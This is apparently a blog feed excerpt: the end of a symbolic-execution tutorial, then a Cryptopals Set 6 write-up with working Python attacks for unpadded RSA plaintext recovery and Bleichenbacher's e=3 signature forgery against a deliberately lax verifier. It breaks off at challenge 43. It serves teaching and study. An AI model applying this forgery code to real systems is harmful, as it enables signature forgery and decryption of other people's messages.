<p><img src="/Principles_of_Symbolic_Execution/image.png" alt=""></p>
<p>Path constraints and symbolic state for all paths in the example function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">➊</span> x :<span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(argv[<span style="color:#ae81ff">0</span>]), y :<span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(argv[<span style="color:#ae81ff">1</span>])
<span style="color:#960050;background-color:#1e0010">➋</span> z :<span style="color:#f92672">=</span> x <span style="color:#f92672">+</span> y
<span style="color:#960050;background-color:#1e0010">➌</span> <span style="color:#66d9ef">if</span> x <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
	foo(x, y, z)
	y :<span style="color:#f92672">=</span> y <span style="color:#f92672">+</span> z
	<span style="color:#66d9ef">if</span> y <span style="color:#f92672">&lt;</span> x: baz(x, y, z)
	<span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> qux(x, y, z)
<span style="color:#960050;background-color:#1e0010">➍</span> <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> bar(x, y, z)
</code></pre></div><p>Step ➊ is reading <em>x</em> and <em>y</em> from user input.</p>
<ul>
<li>The path constraint <em>π</em> is initially set to <em>T</em>(tautology). This shows that no branches have yet been executed, so no constraints are imposed.</li>
<li>Symbolic expression store <em>σ</em> is initially the empty set. After reading x, the symbex engine creates a new symbolic expression <em>φ1 = α1</em>, which corresponds to an unconstrained symbolic value that can represent any concrete value, and maps x to that expression. Reading y causes an analogous effect, mapping y to <em>φ2 = α2</em>.</li>
</ul>
<p>Step ➋ is computing <em>z = x + y.</em></p>
<ul>
<li>The symbex engine maps z to a new symbolic expression <em>φ3 = φ1 + φ2.</em></li>
</ul>
<p>Step ➌ checks conditional if(x &gt;= 5). </p>
<ul>
<li>The engine adds the branch constraint <em>φ1 ≥ 5</em> to <em>π</em> and continues the symbolic execution at the branch target, which is the call to foo.</li>
<li>Because you’ve now reached a call to foo, you can solve the expressions and branch constraints to find concrete values for x and y that lead to this foo invocation.</li>
<li><em>x</em> and <em>y</em> map to the symbolic expressions <em>φ1 = α1</em> and <em>φ2 = α2</em>, respectively, where <em>α1</em> and <em>α2</em> are the only symbolic values.</li>
<li>Only one branch constraint exists: <em>φ1 ≥ 5</em>. </li>
<li>Thus, a possible model to reach this call to foo is <em>α1 = 5 ∧ α2 = 0</em>. 
<ul>
<li><em>α2</em> could take any value because it doesn’t occur in any of the symbolic expressions that appear in the path constraint.</li>
</ul>
</li>
</ul>
<p>Step ➍ takes the <em>else</em> case.</p>
<ul>
<li>To reach the call to bar instead, avoid the if(x &gt;= 5) branch by changing the path constraint <em>φ1 ≥ 5</em> to <em>φ1 &lt; 5</em> and ask the constraint solver for a new model.</li>
<li>Thus, a possible model would be <em>α1 = 4 ∧ α2 = 0</em>.</li>
</ul>
<h2 id="variants">Variants</h2>
<p><img src="/Principles_of_Symbolic_Execution/1_image.png" alt=""></p>
<p>Symbolic execution design dimensions. </p>
<h3 id="static-symbolic-execution-sse">Static Symbolic Execution (SSE)</h3>
<ul>
<li>Emulates part of a program, propagating symbolic state with each emulated instruction. </li>
<li>Either analyzes all possible paths exhaustively or uses heuristics to decide which paths to traverse.</li>
<li>Allows analyzing programs that can’t run on the system CPU, like analyzing ARM binaries on x86.</li>
<li>Exploring both directions at every branch isn’t always possible because of scalability issues.
<ul>
<li>While heuristics can be used to limit the number of explored branches, it’s non-trivial to come up with effective heuristics that capture all the interesting paths.</li>
<li>Forks off a new symbex instance at each branch to explore both directions in parallel.</li>
</ul>
</li>
<li>Parts of an application’s behavior can be hard to model correctly with SSE, specifically when control flows outside the application to software components that the symbolic execution engine doesn’t control, such as the kernel or a library. Happens when a program issues a system call or library call, receives a signal, tries to read an environment variable, and so on.</li>
</ul>
<h5 id="effect-modeling">Effect Modeling</h5>
<p>Models the effects of external interactions like system calls and library calls. These models are a sort of “summary” of the effects that a system or library call has on the symbolic state. Performance-wise, effect modeling is a relatively cheap solution. However, creating accurate models for all possible environment interactions—including with the network, the filesystem, and other processes—is a monumental task, which may involve creating a simulated symbolic filesystem, symbolic network stack, and so on. To make matters worse, the models have to be rewritten to simulate a different operating system or kernel. Models are therefore often incomplete or inaccurate in practice.</p>
<h5 id="direct-external-interactions">Direct External Interactions</h5>
<p>Instead of modeling the effects of a system call, the symbex engine may actually make the system call and incorporate the concrete return value and side effects into the symbolic state. Leads to problems when multiple paths that perform competing external interactions are explored in parallel. For instance, if multiple paths operate on the same physical file in parallel, this may lead to consistency issues if the changes conflict. Can be resolved by cloning the complete system state for each explored path, but that solution is extremely memory intensive. Moreover, because external software components cannot handle symbolic state, interacting directly with the environment means an expensive call to the constraint solver to compute suitable concrete values that can be passed to the system or library call that is being invoked.</p>
<h3 id="dynamic-symbolic-execution-dse">Dynamic Symbolic Execution (DSE)</h3>
<p>Known as <strong>Concolic Execution</strong>, as in “concrete symbolic execution” because this approach uses concrete state to drive the execution while maintaining symbolic state as metadata.</p>
<ul>
<li>Runs only one path at once, as determined by the concrete inputs. To explore different paths, it “flips” the path constraints and then uses the constraint solver to compute concrete inputs that lead to the alternative branch. These concrete inputs can be used to start a new concolic execution that explores the alternative path.</li>
<li>Much more scalable since it doesn’t maintain multiple parallel execution states. </li>
<li>External interactions are run concretely. This doesn’t lead to consistency issues because concolic execution doesn’t run different paths in parallel.</li>
<li>Constraints it computes tend to involve fewer variables since it runs only a part at a time, making the constraints easier and far faster to solve.</li>
<li>Code coverage achieved by concolic execution depends on the initial concrete inputs. Since concolic execution “flips” only a small number of branch constraints at once, it can take a long time to reach interesting paths if these are separated by many flips from the initial path.</li>
<li>Less trivial to symbolically execute only part of a program, although it can be implemented by dynamically enabling or disabling the symbolic engine at runtime.</li>
</ul>
<h3 id="online-vs-offline">Online vs. Offline</h3>
<p>Symbex engines that explore multiple program paths in parallel are called <strong>online</strong>, while engines that explore only one path at a time are called <strong>offline</strong>.</p>
<ul>
<li>Online symbex doesn’t execute the same instruction multiple times, thus making it efficient but making it memory-intensive to keep track of all states in parallel. In contrast, offline implementations often analyze the same chunk of code multiple times, having to run the entire program from the start for every program path. </li>
<li>Online symbex attempt to keep the memory overhead to a minimum by merging identical parts of program states together, splitting them only when they diverge. This optimization is known as <strong>copy on write</strong> because it copies merged states when a write causes them to diverge, creating a fresh private copy of the state for the path issuing the write.</li>
</ul>
<h3 id="symbolic-state">Symbolic State</h3>
<p>Engines provide the option of omitting symbolic state for some registers and memory locations.</p>
<ul>
<li>By tracking symbolic information only for the selected state while keeping the rest of the state concrete, size of the state and the complexity of the path constraints and symbolic expressions can be reduced. This approach is more memory efficient and faster because the constraints are easier to solve.</li>
<li>The trade-off is choosing which state to make symbolic and which to make concrete only, and this decision is not always trivial. Choosing incorrectly may cause the symbex tool to report unexpected results.</li>
<li>Pointers can be symbolic, meaning that their value is not concrete but partly undetermined. This introduces a difficult problem when memory loads or stores use a symbolic address.</li>
</ul>
<h5 id="fully-symbolic-memory">Fully Symbolic Memory</h5>
<p>Solutions based on fully symbolic memory attempt to model all the possible outcomes of a memory load or store operation, forking the state into multiple copies to reflect each possible outcome of the memory operation. For instance, let’s suppose we’re reading from an array a using a symbolic index φi , with the constraint that φi &lt; 5. The state-forking approach would then fork the state into five copies: one for the situation where φi = 0 (so that a[0] is read), another one for φi = 1, and so on. Another way to achieve the same effect is to use constraints with if-then-else expressions supported by some constraint solvers. These expressions are analogous to if-then-else conditionals used in programming languages. In this approach, the same array read is modeled as a conditional constraint that evaluates to the symbolic expression of a[i] if φi = i. This approach suffers from state explosion or extremely complicated constraints if any memory accesses use unbounded addresses. These problems are more prevalent in binary-level symbex than source-level symbex because bounds information is not readily available in binaries.</p>
<h5 id="address-concretization">Address Concretization</h5>
<p>To avoid the state explosion of fully symbolic memory, unbounded symbolic addresses can be replaced with concrete ones.</p>
<ul>
<li>In concolic execution, the symbex engine can simply use the real concrete address.</li>
<li>In static symbolic execution, the engine will have to use a heuristic to decide on a suitable concrete address. </li>
</ul>
<p>It reduces the state space and complexity of constraints considerably, but the downside is that it doesn’t fully capture all possible program behaviors, which may lead the symbex engine to miss some possible outcomes.</p>
<h3 id="path-coverage">Path Coverage</h3>
<p>Classic symbolic execution explores all program paths, forking off a new symbolic state at every branch. This approach doesn’t scale because the number of possible paths increases exponentially with the number of branches in the program; this is the well-known <strong>path explosion problem</strong>. In fact, the number of paths may be infinite if there are unbounded loops or recursive calls. For nontrivial programs, a different approach is required, such as using heuristics to decide which paths to explore. </p>
<ul>
<li>A common heuristic is <strong>DFS</strong> (<strong>Depth-First Search</strong>), which explores one complete program path entirely before moving on to another path, under the assumption that deeply nested code is likely more “interesting” than superficial code. </li>
<li><strong>BFS</strong> (<strong>Breadth-First Search</strong>) does the opposite, exploring all paths in parallel but taking longer to reach deeply nested code.</li>
</ul>
<p>Concolic execution explores only one path at a time as driven by concrete inputs, but can also be combined with the heuristic path exploration approach or even with the approach of exploring all paths. The easiest way to explore multiple paths is to run the application repeatedly, each time with new inputs discovered by “flipping” branch constraints in the previous run. A more sophisticated approach is to take snapshots of the program state so that after exploring one path, the snapshot can restore the state to an earlier point in the execution and explore another path from there.</p>
<h2 id="optimisation">Optimisation</h2>
<h3 id="simplifying-constraints">Simplifying Constraints</h3>
<p>Simplifying constraints as much as possible to keep usage of the constraint solver to an absolute minimum can reduce computation extensively since constraint solving is the most computationally expensive aspect of symbex. Thus, aim to reduce the complexity of the constraint solver’s task, thereby speeding up the symbolic execution, without significantly affecting the accuracy of the analysis.</p>
<h5 id="limiting-the-number-of-symbolic-variables">Limiting the Number of Symbolic Variables</h5>
<p>Simplifying constraints reduces the number of symbolic variables and make the rest of the program state concrete only. However, randomly concretizing state may result in wrong state to be concretized causing your symbex tool to miss possible solutions to the problem. Using a pre-processing pass that employs taint analysis and fuzzing to find inputs that cause dangerous effects, such as a corrupted return address, and then using symbex to find out whether there are any inputs that corrupt that return address such that it allows exploitation, can save a lot of computation. Using relatively cheap techniques such as DTA and fuzzing to find out whether there’s a potential vulnerability and using symbolic execution only in potentially vulnerable program paths to find out how to exploit that vulnerability in practice is a much more efficient approach.</p>
<h5 id="limiting-the-number-of-symbolic-operations">Limiting the Number of Symbolic Operations</h5>
<p>Symbolically execute only those instructions that are relevant. For instance, exploiting an indirect call through the rax register involve focusing on only the instructions that contribute to rax’s value. Thus, computing a backward slice to find the instructions contributing to rax and then symbolically emulating the instructions in the slice reduces number of symbolic operations in contrast to emulating all instructions.</p>
<h5 id="simplifying-symbolic-memory">Simplifying Symbolic Memory</h5>
<p>Full symbolic memory can cause an explosion in the number of states or the size of the constraints if there are any unbounded symbolic memory accesses. Impact of such memory accesses on constraint complexity can be reduced by concretizing them.</p>
<h3 id="avoiding-the-constraint-solver">Avoiding the Constraint Solver</h3>
<p>There are practical ways to limit the need for constraint solving in symbex tools, such as using pre-processing passes to find potentially interesting paths and inputs to explore with symbex and pinpoint the instructions affected by these inputs. This helps in avoiding needless constraint solver invocations for uninteresting paths or instructions. Symbex engines and constraint solvers may also cache the results of previously evaluated (sub)formulas, thereby avoiding the need to solve the same formula twice.</p>
]]></content>
        </item>
        
        <item>
            <title>Set 6</title>
            <link>https://hexterisk.github.io/blog/posts/2020/04/10/set-6/</link>
            <pubDate>Fri, 10 Apr 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/04/10/set-6/</guid>
            <description>Refer to this repository for solution scripts and the IPython Notebook pertaining to the explanations here.
Challenge 41: Implement unpadded message recovery oracle Link
 Nate Lawson says we should stop calling it &amp;ldquo;RSA padding&amp;rdquo; and start calling it &amp;ldquo;RSA armoring&amp;rdquo;. Here&amp;rsquo;s why.
Imagine a web application, again with the Javascript encryption, taking RSA-encrypted messages which (again: Javascript) aren&amp;rsquo;t padded before encryption at all.
You can submit an arbitrary RSA blob and the server will return plaintext.</description>
            <content type="html"><![CDATA[<p>Refer to this <a href="https://github.com/hexterisk/cryptopals-solutions">repository</a> for solution scripts and the IPython Notebook pertaining to the explanations here.</p>
<h3 id="challenge-41-implement-unpadded-message-recovery-oracle">Challenge 41: Implement unpadded message recovery oracle</h3>
<p><a href="https://cryptopals.com/sets/6/challenges/41">Link</a></p>
<blockquote>
<p>Nate Lawson says we should stop calling it &ldquo;RSA padding&rdquo; and start calling it &ldquo;RSA armoring&rdquo;. Here&rsquo;s why.<br>
Imagine a web application, again with the Javascript encryption, taking RSA-encrypted messages which (again: Javascript) aren&rsquo;t padded before encryption at all.<br>
You can submit an arbitrary RSA blob and the server will return plaintext. But you can&rsquo;t submit the same message twice: let&rsquo;s say the server keeps hashes of previous messages for some liveness interval, and that the message has an embedded timestamp: ** {<br>
time: 1356304276,<br>
social: &lsquo;555-55-5555&rsquo;,<br>
}<br>
You&rsquo;d like to capture other people&rsquo;s messages and use the server to decrypt them. But when you try, the server takes the hash of the ciphertext and uses it to reject the request. Any bit you flip in the ciphertext irrevocably scrambles the decryption.<br>
This turns out to be trivially breakable:</p>
<ul>
<li>Capture the ciphertext C</li>
<li>Let N and E be the public modulus and exponent respectively</li>
<li>Let S be a random number &gt; 1 mod N. Doesn&rsquo;t matter what.</li>
<li>Now:<br>
<strong>C&rsquo; = ((S**E mod N) C) mod N</strong></li>
<li>Submit C&rsquo;, which appears totally different from C, to the server, recovering P&rsquo;, which appears totally different from P</li>
<li>Now: <br>
<strong>P = P&rsquo; / S mod N</strong></li>
</ul>
<p>Oops!<br>
Implement that attack.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> random
</code></pre></div><p>Define a class that works as a server as described by the question.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RSA_server</span>(RSA):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Extends the RSA class to verify that no ciphertext passes through more than once.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    decrypted <span style="color:#f92672">=</span> []
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_public_key</span>(self: object) <span style="color:#f92672">-&gt;</span> tuple:
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>pub
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_check</span>(self: object, ciphertext: bytes) <span style="color:#f92672">-&gt;</span> bytes:
        <span style="color:#66d9ef">if</span> ciphertext <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>decrypted:
            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;This ciphertext has already been deciphered before!&#34;</span>)
        self<span style="color:#f92672">.</span>decrypted<span style="color:#f92672">.</span>append(ciphertext)
        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>decrypt(ciphertext)
</code></pre></div><p>This attack focuses on a particular property of RSA: homorphism. The output(ciphertext) of an RSA encryption engine is a number, and therefore any operation carried out on this is reflected on the plaintext produced when we decrypt this ciphertext, and thus preserves the original state of the plaintext.</p>
<p>Once we obtain a ciphertext, we can ask the oracle to decrypt multiples of ciphertext( ie <em>2 * ciphertext</em>, <em>3 * ciphertext</em>, …<em>n * ciphertext</em> where <em>n</em> is an integer). We can then use the result of these decryptions to obtain the original plaintext by just dividing the scaling factor for the respective ciphertexts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unpadded_message_recovery</span>(ciphertext: bytes, rsa_server: object) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Modifies ciphertext and recovers plaintext from an RSA server.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    (E, N) <span style="color:#f92672">=</span> rsa_server<span style="color:#f92672">.</span>get_public_key()
    S <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, N)
    <span style="color:#66d9ef">while</span> True:
        <span style="color:#66d9ef">if</span> S <span style="color:#f92672">%</span> N <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
            <span style="color:#66d9ef">break</span>
    
    modified_ciphertext <span style="color:#f92672">=</span> (pow(S, E, N) <span style="color:#f92672">*</span> ciphertext) <span style="color:#f92672">%</span> N
    
    modified_plaintext <span style="color:#f92672">=</span> rsa_server<span style="color:#f92672">.</span>decrypt_check(modified_ciphertext)
    recovered_plaintext_int <span style="color:#f92672">=</span> (int<span style="color:#f92672">.</span>from_bytes(modified_plaintext, <span style="color:#e6db74">&#34;big&#34;</span>) <span style="color:#f92672">*</span> mod_inverse(S, N) <span style="color:#f92672">%</span> N)
    
    <span style="color:#66d9ef">return</span> (recovered_plaintext_int)<span style="color:#f92672">.</span>to_bytes((recovered_plaintext_int<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rsa_server <span style="color:#f92672">=</span> RSA_server(<span style="color:#ae81ff">256</span>)
plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Unpadded message&#34;</span>
ciphertext <span style="color:#f92672">=</span> rsa_server<span style="color:#f92672">.</span>encrypt(plaintext<span style="color:#f92672">.</span>encode())
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-42-bleichenbachers-e3-rsa-attack">Challenge 42: Bleichenbacher&rsquo;s e=3 RSA Attack</h3>
<p><a href="https://cryptopals.com/sets/6/challenges/42">Link</a></p>
<blockquote>
<p>RSA with an encrypting exponent of 3 is popular, because it makes the RSA math faster.<br>
With e=3 RSA, encryption is just cubing a number mod the public encryption modulus:<br>
<strong>c = m ** 3 % n</strong><br>
e=3 is secure as long as we can make assumptions about the message blocks we&rsquo;re encrypting. The worry with low-exponent RSA is that the message blocks we process won&rsquo;t be large enough to wrap the modulus after being cubed. The block 00:02 (imagine sufficient zero-padding) can be &ldquo;encrypted&rdquo; in e=3 RSA; it is simply 00:08.<br>
When RSA is used to sign, rather than encrypt, the operations are reversed; the verifier &ldquo;decrypts&rdquo; the message by cubing it. This produces a &ldquo;plaintext&rdquo; which the verifier checks for validity.<br>
When you use RSA to sign a message, you supply it a block input that contains a message digest. The PKCS1.5 standard formats that block as:<br>
<strong>00h 01h ffh ffh &hellip; ffh ffh 00h ASN.1 GOOP HASH</strong><br>
As intended, the ffh bytes in that block expand to fill the whole block, producing a &ldquo;right-justified&rdquo; hash (the last byte of the hash is the last byte of the message).<br>
There was, 7 years ago, a common implementation flaw with RSA verifiers: they&rsquo;d verify signatures by &ldquo;decrypting&rdquo; them (cubing them modulo the public exponent) and then &ldquo;parsing&rdquo; them by looking for 00h 01h &hellip; ffh 00h ASN.1 HASH.<br>
This is a bug because it implies the verifier isn&rsquo;t checking all the padding. If you don&rsquo;t check the padding, you leave open the possibility that instead of hundreds of ffh bytes, you have only a few, which if you think about it means there could be squizzilions of possible numbers that could produce a valid-looking signature.<br>
How to find such a block? Find a number that when cubed (a) doesn&rsquo;t wrap the modulus (thus bypassing the key entirely) and (b) produces a block that starts &ldquo;00h 01h ffh &hellip; 00h ASN.1 HASH&rdquo;.<br>
There are two ways to approach this problem:</p>
<ul>
<li>You can work from Hal Finney&rsquo;s writeup, available on Google, of how Bleichenbacher explained the math &ldquo;so that you can do it by hand with a pencil&rdquo;.</li>
<li>You can implement an integer cube root in your language, format the message block you want to forge, leaving sufficient trailing zeros at the end to fill with garbage, then take the cube-root of that block.</li>
</ul>
<p>Forge a 1024-bit RSA signature for the string &ldquo;hi mom&rdquo;. Make sure your implementation actually accepts the signature!</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> re
<span style="color:#f92672">import</span> hashlib

<span style="color:#75715e"># Given</span>
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hi mom&#34;</span>

ASN1_SHA1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>NOTE: The attack works specifically for e = 3, as mentioned in the question itself.</p>
<p>PKCS#1 v1.5 says that the hash of the message to be signed has to be encoded in the form like: <code>00 01 FF FF ... FF FF 00 ASN.1 HASH</code> </p>
<p>The signature generation goes like: <em>mᵈ mod N</em></p>
<p>While, the signature verification goes like: <em>(mᵈ)ᵉ = m mod N</em></p>
<p>Numbers have to be in big endian because cubing takes place, and interferes with the bit manipulation.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RSA_Digital_Signature</span>(RSA):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Extends the RSA class coded before with the sign / verify functions.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_signature</span>(self: object, message: bytes) <span style="color:#f92672">-&gt;</span> bytes:
        digest <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(message)<span style="color:#f92672">.</span>digest()
        block <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">128</span> <span style="color:#f92672">-</span> len(digest) <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">15</span>)) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> ASN1_SHA1 <span style="color:#f92672">+</span> digest
        signature <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>decrypt(int<span style="color:#f92672">.</span>from_bytes(block, <span style="color:#e6db74">&#34;big&#34;</span>), <span style="color:#e6db74">&#34;big&#34;</span>)
        <span style="color:#66d9ef">return</span> signature

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_signature</span>(self: object, message: bytes, signature: bytes) <span style="color:#f92672">-&gt;</span> bool:
        cipher <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>encrypt(signature, <span style="color:#e6db74">&#34;big&#34;</span>)
        block <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> cipher<span style="color:#f92672">.</span>to_bytes((cipher<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
        r <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01\xff</span><span style="color:#e6db74">+?</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">.{15}(.{20})&#39;</span>, re<span style="color:#f92672">.</span>DOTALL)
        m <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>match(block)
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> m:
            <span style="color:#66d9ef">return</span> False
        digest <span style="color:#f92672">=</span> m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
        <span style="color:#66d9ef">return</span> digest <span style="color:#f92672">==</span> hashlib<span style="color:#f92672">.</span>sha1(message)<span style="color:#f92672">.</span>digest()
</code></pre></div><p>Test the oracle.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rsa <span style="color:#f92672">=</span> RSA_Digital_Signature(<span style="color:#ae81ff">1024</span>)
signature <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>generate_signature(message<span style="color:#f92672">.</span>encode())
<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rsa<span style="color:#f92672">.</span>verify_signature(message<span style="color:#f92672">.</span>encode(), signature):
    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(message <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; has invalid signature &#34;</span> <span style="color:#f92672">+</span> signature)
<span style="color:#66d9ef">else</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature verified for message:&#34;</span>, message)
</code></pre></div><p><code>&gt; Signature verified for message: hi mom</code></p>
<p>A broken padding validator(and this is pretty common) might just check for the presence of <code>FF 00 ASN.1</code> and would simply parse the <code>HASH</code> present right after. This leaves us the room to play with the bytes between <code>00 01 FF</code> and <code>FF 00 ASN.1</code></p>
<p>Now, the caveat here is that the message is not signed. Instead, the PKCS#1 padded hash of the message is signed.</p>
<p>Therefore, if <em>e = 3</em>, we can pass a value that when cubed and and having the modulus operation applied, passes the format check.</p>
<p>It will then be in the form <code>00 01 FF FF ... FF FF 00 ASN.1 HASH ADDED_HASH</code> </p>
<p>Thus, forging message simply means to find such a number as described above, which will pass the verification and carry our message.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forge_signature</span>(message: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Forges the SHA1 signature of the message
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    digest <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(message)<span style="color:#f92672">.</span>digest()
    block <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x01\xff\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span>  ASN1_SHA1 <span style="color:#f92672">+</span> digest <span style="color:#f92672">+</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">128</span> <span style="color:#f92672">-</span> len(digest) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">15</span>))
    block_int <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(block, <span style="color:#e6db74">&#34;big&#34;</span>)
    sig <span style="color:#f92672">=</span> floorRoot(block_int, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
    <span style="color:#66d9ef">return</span> sig<span style="color:#f92672">.</span>to_bytes((sig<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">forged_signature <span style="color:#f92672">=</span> forge_signature(message<span style="color:#f92672">.</span>encode())
<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rsa<span style="color:#f92672">.</span>verify_signature(message<span style="color:#f92672">.</span>encode(), forged_signature):
    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(message <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; has invalid signature &#34;</span> <span style="color:#f92672">+</span> forged_signature)
    test(False)
<span style="color:#66d9ef">else</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature verified for message:&#34;</span>, message)
</code></pre></div><p><code>&gt; Signature verified for message: hi mom</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-43-dsa-key-recovery-from-nonce">Challenge 43: DSA key recovery from nonce</h3>
